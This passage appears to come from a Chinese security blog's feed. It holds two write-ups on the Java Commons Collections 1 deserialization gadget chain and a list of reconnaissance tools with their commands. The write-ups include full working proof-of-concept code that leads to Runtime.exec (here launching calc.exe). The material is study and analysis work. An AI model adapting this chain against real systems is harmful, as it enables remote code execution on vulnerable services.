Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    construct.setAccessible(true);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>这时候在 <code>AnnotationInvocationHandler</code>的<code>readObject</code>方法里面 <code>memberValues</code>就是我们使用反射传入的 <code>TransformedMap</code>的对象。代码中遍历了它的所有元素，并依次设置值。在调用<code>setValue</code>设置值的时候就会触发<code>TransformedMap</code>⾥的<code>Transform</code>方法，从而导致命令的执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">      // for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">           Object value = null;</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">               Object value = memberValue.getValue();</span><br><span class="line">               value = memberValue.getValue();</span><br><span class="line">                if (!(memberType.isInstance(value) ||</span><br><span class="line">                      value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                   memberValue.setValue(</span><br><span class="line">                       new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                   value = new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                               annotationType.members().get(name)));</span><br><span class="line">                               annotationType.members().get(name));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           mv.put(name, value);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        </span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                            String.class,</span><br><span class="line">                            Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                            new Class[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                            Object.class,</span><br><span class="line">                            Object[].class &#125;, new Object[] &#123; null, new</span><br><span class="line">                            Object[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class</span><br><span class="line">                    &#125;,</span><br><span class="line">                            new String[] &#123;</span><br><span class="line">                                    &quot;calc.exe&quot; &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new</span><br><span class="line">                    ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">                    transformerChain);</span><br><span class="line">            Class clazz =</span><br><span class="line">                    Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                    Map.class);</span><br><span class="line">            construct.setAccessible(true);</span><br><span class="line">            InvocationHandler handler = (InvocationHandler)</span><br><span class="line">                    construct.newInstance(Retention.class, outerMap);</span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">            oos.close();</span><br><span class="line">            System.out.println(barr);</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(new</span><br><span class="line">                    ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">            Object o = (Object)ois.readObject();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425014904438-114576049.png" alt="image-20220425014902982"></p><p>测试过程发现，jdk1.8.0_321无法达到命令执行的目的，后面换了个jdk1.7.0_21才执行成功</p><p>在高版本中的<code>AnnotationInvocationHandler</code>的<code>readObject</code>是被改动过的，如下为低版本jdk</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425015123743-612622047.png" alt="image-20220425015122452"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13791793.html">https://www.cnblogs.com/nice0e3/p/13791793.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;继续接着上文，上文我们通过方法调用弹出了计算器，那么在反序列化的漏洞场景下该如何运用呢。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>常用的信息收集工具</title>
    <link href="https://kpa1on.github.io/2022/03/31/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
    <id>https://kpa1on.github.io/2022/03/31/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</id>
    <published>2022-03-31T15:31:11.000Z</published>
    <updated>2022-04-26T05:08:24.391Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><h4 id="爱站、站长工具"><a href="#爱站、站长工具" class="headerlink" title="爱站、站长工具"></a>爱站、站长工具</h4><p>SEO综合查询：根据域名来收集目标站点的备案信息、名称、注册人等信息</p><span id="more"></span><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331234824808-1321230515.png" alt="image-20220331234824770"></p><p>ICP备案查询：可以查询该单位备案的其它网站</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235548245-1513379625.png" alt="image-20220331235548490"></p><p>Whois查询：可以通过域名、邮箱、注册人查询目标信息，或者通过Whois反查获取更多的信息</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235812621-1264700791.png" alt="image-20220331235812791"></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331235833979-743434060.png" alt="image-20220331235834229"></p><h4 id="天眼查、企查查"><a href="#天眼查、企查查" class="headerlink" title="天眼查、企查查"></a>天眼查、企查查</h4><p>天眼查：根据前面获取的企业名称可以获取目标企业的微信公众号、微博、备案站点、APP、软件著作权等信息。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401001038436-305034698.png" alt="image-20220401001038521"></p><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><ul><li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target xxx.cn run</span><br></pre></td></tr></table></figure><ul><li>JSFinder：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 JSFinder.py -u http://www.xxx.cn -d -ou JSurl.txt -os JSdomain.txt</span><br></pre></td></tr></table></figure><ul><li>Layer</li><li>subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python subDomainsBrute.py -t 10 xxx.cn -o xxx.cn.txt</span><br><span class="line">python subDomainsBrute.py -t 10 --full xxx.cn -o xxx.cn.txt //全扫描</span><br></pre></td></tr></table></figure><ul><li><p>dnsub：<a href="https://github.com/yunxu1/dnsub/">https://github.com/yunxu1/dnsub/</a></p></li><li><p>Findomain：<a href="https://github.com/Findomain/Findomain">https://github.com/Findomain/Findomain</a></p></li><li><p>subdomain3：<a href="https://github.com/yanxiu0614/subdomain3">https://github.com/yanxiu0614/subdomain3</a></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python brutedns.py -d tagetdomain -s high -l 5</span><br></pre></td></tr></table></figure><ul><li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sublist3r.py -d 6pian.cn -o xxx.cn-sublist3r.txt</span><br></pre></td></tr></table></figure><ul><li>DNSdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li><li>在线域名爆破：<a href="http://z.zcjun.com/">http://z.zcjun.com</a></li><li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li><li>谷歌语法：site:url.com</li></ul><h3 id="APP信息收集"><a href="#APP信息收集" class="headerlink" title="APP信息收集"></a>APP信息收集</h3><ul><li>七麦数据：<a href="https://www.qimai.cn/">https://www.qimai.cn/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401003223994-2015673218.png" alt="image-20220401003224149"></p><ul><li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401003436145-1522334794.png" alt="image-20220401003436333"></p><ul><li>AppStore：<a href="https://apps.apple.com/">https://apps.apple.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401004923689-1032764987.png" alt="image-20220401004923517"></p><ul><li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011632625-394917638.png" alt="image-20220401011632788"></p><ul><li>点点：<a href="https://app.diandian.com/">https://app.diandian.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011706699-1039405072.png" alt="image-20220401011706880"></p><h3 id="公众号收集"><a href="#公众号收集" class="headerlink" title="公众号收集"></a>公众号收集</h3><ul><li>搜狗搜索引擎：<a href="https://weixin.sogou.com/weixin">https://weixin.sogou.com/weixin</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401005726464-268705547.png" alt="image-20220401005725553"></p><ul><li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401005946939-1109072144.png" alt="image-20220401005947045"></p><ul><li>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011237675-182402682.png" alt="image-20220401011237714"></p><h3 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h3><ul><li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li></ul><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011528721-1750840481.png" alt="image-20220401011528606"></p><h3 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h3><ul><li>Nmap、Masscan：Github上面有一款工具将Nmap和Masscan集成起来，先用Masscan批量扫端口，然后用Nmap识别服务。下载地址：<a href="https://github.com/cwkiller/masscan_to_nmap">https://github.com/cwkiller/masscan_to_nmap</a></li><li>小米范WEB查找器</li><li>Fofa、Shodan、ZoomEye</li><li>利用GoogleHacking</li></ul><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><ul><li>BugScaner：<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a></li><li>潮汐指纹：<a href="http://finger.tidesec.com/">http://finger.tidesec.com</a></li><li>Kscan：<a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a></li><li>dismap：<a href="https://github.com/zhzyker/dismap">https://github.com/zhzyker/dismap</a></li><li>Ehole：<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></li><li>ObserverWard：<a href="https://github.com/0x727/ObserverWard">https://github.com/0x727/ObserverWard</a></li><li>scaninfo：<a href="https://github.com/redtoolskobe/scaninfo">https://github.com/redtoolskobe/scaninfo</a></li><li>whatweb：<a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></li><li>TideFinger：<a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></li></ul><h3 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h3><ul><li>github</li><li>网盘搜索</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">盘多多：http://www.panduoduo.net/</span><br><span class="line">盘搜搜：http://www.pansoso.com/</span><br><span class="line">盘搜：http://www.pansou.com/</span><br><span class="line">凌云风搜索：https://www.lingfengyun.com/</span><br><span class="line">直接输入厂商名字然后搜索，可以看看是否泄露了源码，或者什么账号密码之类的</span><br></pre></td></tr></table></figure><ul><li>路径扫描</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch：https://github.com/maurosoria/dirsearch</span><br><span class="line">dirmap：https://github.com/H4ckForJob/dirmap</span><br><span class="line">御剑后台扫描</span><br><span class="line">7kbscan：https://github.com/7kbstorm/7kbscan-WebPathBrute</span><br></pre></td></tr></table></figure><ul><li>基于证书</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://myssl.com</span><br><span class="line">https://crt.sh/</span><br></pre></td></tr></table></figure><ul><li>基于shodan找到带有该icon的网站</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/a_6M0h-7l9-IKG5F5Nar8g">https://mp.weixin.qq.com/s/a_6M0h-7l9-IKG5F5Nar8g</a></p><p><a href="https://mp.weixin.qq.com/s/uUrlBrwcPPPr6s1yFeGP1A">https://mp.weixin.qq.com/s/uUrlBrwcPPPr6s1yFeGP1A</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;域名信息收集&quot;&gt;&lt;a href=&quot;#域名信息收集&quot; class=&quot;headerlink&quot; title=&quot;域名信息收集&quot;&gt;&lt;/a&gt;域名信息收集&lt;/h3&gt;&lt;h4 id=&quot;爱站、站长工具&quot;&gt;&lt;a href=&quot;#爱站、站长工具&quot; class=&quot;headerlink&quot; title=&quot;爱站、站长工具&quot;&gt;&lt;/a&gt;爱站、站长工具&lt;/h4&gt;&lt;p&gt;SEO综合查询：根据域名来收集目标站点的备案信息、名称、注册人等信息&lt;/p&gt;</summary>
    
    
    
    <category term="工具使用" scheme="https://kpa1on.github.io/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="信息收集" scheme="https://kpa1on.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections1分析（一）</title>
    <link href="https://kpa1on.github.io/2022/03/31/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://kpa1on.github.io/2022/03/31/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2022-03-31T13:29:33.000Z</published>
    <updated>2022-03-31T15:02:59.605Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC链的前置基础学习完后，就可以开始学习CC链的具体执行流程。</p><span id="more"></span><h3 id="CC链分析"><a href="#CC链分析" class="headerlink" title="CC链分析"></a>CC链分析</h3><p>先来看下poc代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //创建Map并绑定transformer</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        //给予map数据转化链</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        //触发漏洞</span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br><span class="line">        onlyElement.setValue(&quot;test&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面逐一分析</p><p>先看下面这段代码，<code>ConstantTransformer</code>和<code>InvokerTransformer</code>都是<code>Transformer</code>接口的实现类，通过new创建了一个 Transformer类型的数组，里面存储的是 Transformer的实现类对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><h3 id="ConstantTransformer分析"><a href="#ConstantTransformer分析" class="headerlink" title="ConstantTransformer分析"></a>ConstantTransformer分析</h3><p>先来分析一下<code>ConstantTransformer</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331213802750-70517686.png" alt="image-20220331213801907"></p><p>这里是使用了构造方法传入参数，poc中传入的参数为<code>Runtime.class</code>，而在调用到transform时，会返回我们传入的参数，也就是返回这里的<code>iConstant</code>。</p><h3 id="InvokerTransformer分析"><a href="#InvokerTransformer分析" class="headerlink" title="InvokerTransformer分析"></a>InvokerTransformer分析</h3><p>打一个debug跟踪到<code>InvokerTransformer</code>类的构造方法里面</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331214255708-71059607.png" alt="image-20220331214256009"></p><p>可以看到传入到构造方法中有三个参数，第一个是方法名，第二个是参数类型，第三个是参数的值。</p><p>poc里的三个<code>InvokerTransformer</code>的参数值，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getMethod,new Class[]&#123;String.class, Class[].class&#125;,new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;</span><br><span class="line">invoke,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;</span><br><span class="line">exec,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure><p>在<code>InvokerTransformer</code>类中同样存在<code>transform</code>方法，后面再具体分析</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331214746603-820866591.png" alt="image-20220331214746902"></p><h3 id="ChainedTransformer分析"><a href="#ChainedTransformer分析" class="headerlink" title="ChainedTransformer分析"></a>ChainedTransformer分析</h3><p>poc代码继续往下分析，可以看到如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformerChain = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure><p>将<code>transformers</code>数组传入<code>ChainedTransformer</code>构造方法里面。在构造方法中将<code>transformers</code>赋值给本类的成员变量<code>iTransformers</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215100803-248909615.png" alt="image-20220331215101175"></p><p>该类同样存在<code>transform</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215116522-1090283627.png" alt="image-20220331215116950"></p><p><code>transform</code>方法的作用会遍历<code>transformers</code>数组，然后逐个去调用它的<code>transform</code>方法。 并且还可以看出该方法会将第一次的执行结果传递给第二次执行的参数里面去。知道了<code>ChainedTransformer</code>的作用后，我们需要知道的是<code>ChainedTransformer</code>的<code>transform</code>什么时候会被调用。继续往下调试</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215715399-2078158251.png" alt="image-20220331215715632"></p><p>进入<code>setValue</code>方法，继续跟进，可以在<code>TransformedMap#checkSetValue</code>方法中发现调用了<code>ChainedTransformer</code>的<code>transform</code>方法，这里之前在前置学习中就已经分析过了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215643520-1021755760.png" alt="image-20220331215643925"></p><p>后面自然就循环调用每个<code>Transformer</code>的<code>transform</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215923877-1365581574.png" alt="image-20220331215924083"></p><p>根据顺序，会调用第一个<code>ConstantTransformer</code>的<code>transform</code>方法，也就是返回构造函数中设置的<code>iConstant</code>，这里就是<code>Runtime.class</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331220100853-1922932681.png" alt="image-20220331220101252"></p><p>接着往下，就到了InvokerTransformer，可以看到参数input的值是上个Transformer返回的结果Runtime.class，后面就是利用反射拿到Runtime对象，因为Runtime没有构造方法需要调用getRuntime()方法获取到Runtime对象，所以这里的流程是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getClass().getMethod(&quot;getRuntime&quot;,null).invoke() -&gt; Method</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331220634247-69976373.png" alt="image-20220331220634207"></p><p>继续跟，来到第二个<code>InvokerTransformer</code>，分析如上，因为上面获得了一个Method，那么我们就需要调用它的invoke方法来执行，所以这里getMethod方法里的参数值为invoke，第二个参数即参传入的参数类型Object</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331222329052-1798048744.png" alt="image-20220331222329120"></p><p>接着往下，来到第三个<code>InvokerTransformer</code>，也就是最后一个<code>Transformer</code>，这里可以看到输入input成功拿到Runtime对象，现在只需要执行<code>Runtime#exe</code>方法即可，同样先通过<code>getMethod</code>方法拿到exec对应的Method，所以这里<code>getMethod</code>的第一个参数，就是exec，第二个参数即exec方法执行的参数类型String，返回method，然后调用invoke执行，参数为calc.exe。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331223102527-1052480704.png" alt="image-20220331223102622"></p><p>之后弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331224112146-817721721.png" alt="image-20220331224112138"></p><p>整个过程归纳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过ConstantTransformer得到Runtime.class,然后再InvokerTransformer反射得到getRuntime方法，然后通过反射执行invoke才能去调用getRuntime方法，这样得到一个Runtime对象，然后再去调用Runtime对象的exec方法去达到命令执行。</span><br></pre></td></tr></table></figure><h3 id="transform方法调用分析"><a href="#transform方法调用分析" class="headerlink" title="transform方法调用分析"></a>transform方法调用分析</h3><p>分析下poc中<code>TransformedMap#decorate</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></pre></td></tr></table></figure><p>调试进入decorate方法，然后跟进来到<code>TransformedMap</code>的构造方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331224824303-1180474727.png" alt="image-20220331224824509"></p><p>构造方法把传入的map和Transformer进行赋值。那么要想知道<code>ChainedTransformer</code>是如何调用<code>transform</code>方法，只需在当前类中搜索<code>valueTransformer</code>，因为<code>ChainedTransformer</code>是赋值给<code>valueTransformer</code>的，然后在<code>transformValue</code>方法中发现了transform方法的调用</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225033806-1139569585.png" 